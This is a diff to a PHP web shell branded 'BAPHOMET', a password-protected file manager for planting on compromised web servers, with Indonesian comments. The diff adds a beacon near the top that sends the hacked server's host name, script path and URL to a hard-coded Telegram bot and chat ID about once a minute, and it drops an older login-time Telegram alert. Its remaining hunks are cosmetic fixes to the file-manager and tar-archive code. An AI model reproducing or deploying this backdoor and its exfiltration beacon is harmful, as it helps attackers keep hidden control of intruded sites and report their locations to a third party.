@@ -10,7 +10,7 @@ error_reporting(0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
 
-/* Configurasi */
+/* Konfigurasi */
 $aupas = '208becc799e24048a7540fd8417907ec'; // BAPHOMET
 $default_action = 'FilesMan';
 $default_use_ajax = true;
@@ -23,6 +23,33 @@ define('TELEGRAM_CHAT_ID', '7299591453');
 function sendTelegramMessage($message) {
     $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage?chat_id=" . TELEGRAM_CHAT_ID . "&text=" . urlencode($message);
     file_get_contents($url); // Kirim pesan
+}
+
+// Jeda pengiriman pesan (dalam detik)
+$send_interval = 60; // 60 detik
+
+// Cek waktu terakhir pengiriman
+if (!isset($_SESSION['last_sent_time'])) {
+    $_SESSION['last_sent_time'] = 0;
+}
+
+$current_time = time();
+if ($current_time - $_SESSION['last_sent_time'] >= $send_interval) {
+    // Ambil informasi keberadaan bot
+    $server_info = "Host: " . $_SERVER['HTTP_HOST'] . "\n";
+    $script_name = "Script Name: " . $_SERVER['SCRIPT_NAME'] . "\n";
+    $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
+
+    // Buat pesan
+    $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url;
+
+    // Kirim pesan
+    sendTelegramMessage($message);
+
+    // Update waktu terakhir pengiriman
+    $_SESSION['last_sent_time'] = $current_time;
+} else {
+    echo "Pesan sudah dikirim. Tunggu sebelum mengirim lagi.";
 }
 function login_shell() {
     ?>
@@ -39,7 +66,7 @@ function login_shell() {
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
     <style>
         body {
-            background-image: url('https://wallpapercave.com/wp/wp8851344.jpg');
+            background-image: url('https://wallpapercave.com/uwp/uwp4534249.jpeg');
             background-size: cover; /* Menutupi seluruh halaman */
             background-position: center; /* Memposisikan gambar di tengah */
             height: 100vh; /* Memastikan tinggi halaman 100% dari viewport */
@@ -50,7 +77,7 @@ function login_shell() {
     <div class="container text-center mt-3">
         <h1> ❝𝗕𝗛𝗔𝗣𝗢𝗠𝗘𝗧❞ </h1>
         <h5>S∀N∀⊥∀S O SOI⅁∀</h5><hr/>
-        <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> 𝗟𝗢𝗚𝗜𝗡 𝗗𝗨𝗟𝗨 𝗠𝗔𝗦 </p>
+        <p class="mt-3 font-weight-bold"><i class="fa fa-terminal"></i> 𝗟𝗢𝗚𝗜𝗡 𝗗𝗨𝗟𝗨 </p>
         <form method="post">
             <div class="form-group input-group">
                 <div class="input-group-prepend">
@@ -70,10 +97,6 @@ exit;
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     if (isset($_POST['pass']) && (md5($_POST['pass']) == $aupas)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-        
-        // URL file yang ingin dikirimkan
-        $urlpath = "$urlpath"; // Ganti dengan URL yang sesuai
-        sendTelegramMessage("file tersedia di $urlpath"); // Kirim pesan ke Telegram
     } else {
         login_shell();
     }
@@ -377,11 +400,11 @@ function fm_arr_to_option($arr,$n,$sel=''){
 
 function fm_lang_form ($current='en'){
 return '
-<formname="change_lang" method="post" action="">
+<form name="change_lang" method="post" action="">
     <select name="fm_lang" title="'.__('Language').'" onchange="document.forms[\'change_lang\'].submit()" >
         <option value="en" '.($current=='en'?'selected="selected" ':'').'>'.__('English').'</option>
         <option value="de" '.($current=='de'?'selected="selected" ':'').'>'.__('German').'</option>
-        <option value="ru"'.($current=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
+        <option value="ru" '.($current=='ru'?'selected="selected" ':'').'>'.__('Russian').'</option>
         <option value="fr" '.($current=='fr'?'selected="selected" ':'').'>'.__('French').'</option>
         <option value="uk" '.($current=='uk'?'selected="selected" ':'').'>'.__('Ukrainian').'</option>
     </select>
@@ -932,7 +955,7 @@ if (isset($_GET['fm_settings'])) {
 <tr><td class="row1"><input name="fm_login[login]" value="'.$auth['login'].'" type="text"></td><td class="row2 whole">'.__('Login').'</td></tr>
 <tr><td class="row1"><input name="fm_login[password]" value="'.$auth['password'].'" type="text"></td><td class="row2 whole">'.__('Password').'</td></tr>
 <tr><td class="row1"><input name="fm_login[cookie_name]" value="'.$auth['cookie_name'].'" type="text"></td><td class="row2 whole">'.__('Cookie').'</td></tr>
-<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$auth['days_authorization'].'"type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
+<tr><td class="row1"><input name="fm_login[days_authorization]" value="'.$auth['days_authorization'].'" type="text"></td><td class="row2 whole">'.__('Days').'</td></tr>
 <tr><td class="row1"><textarea name="fm_login[script]" cols="35" rows="7" class="textarea_input" id="auth_script">'.$auth['script'].'</textarea></td><td class="row2 whole">'.__('Script').'</td></tr>
 <tr><td colspan="2" class="row3"><input type="submit" value="'.__('Save').'" ></td></tr>
 </form>
@@ -1471,7 +1494,7 @@ class archiveTar {
                 }
                 $tmpArchive = gzopen($this->archive_name.'.tmp', 'rb');
                 if (!$tmpArchive){
-                    $this->errors[] = $this->archive_name.'.tmp '.__('is notreadable');
+                    $this->errors[] = $this->archive_name.'.tmp '.__('is not readable');
                     rename($this->archive_name.'.tmp', $this->archive_name);
                     return false;
                 }
@@ -1507,7 +1530,8 @@ class archiveTar {
         if ($newArchive && !$result){
         $this->closeTmpFile();
         unlink($this->archive_name);
-        }return $result;
+        }
+        return $result;
     }
 
     function restoreArchive($path){
@@ -1658,7 +1682,8 @@ class archiveTar {
                 }
             } elseif (($this->dirCheck(($header['typeflag'] == '5' ? $header['filename'] : dirname($header['filename'])))) != 1){
                 $this->errors[] = __('Cannot create directory').' '.__(' for ').$header['filename'];
-                return false;}
+                return false;
+            }
 
             if ($header['typeflag'] == '5'){
                 if (!file_exists($header['filename']))      {
@@ -1856,7 +1881,9 @@ class archiveTar {
         }
     }
 
-    function closeTmpFile(){if (is_resource($this->tmp_file)){if ($this->isGzipped)
+    function closeTmpFile(){
+        if (is_resource($this->tmp_file)){
+            if ($this->isGzipped)
                 gzclose($this->tmp_file);
             else
                 fclose($this->tmp_file);
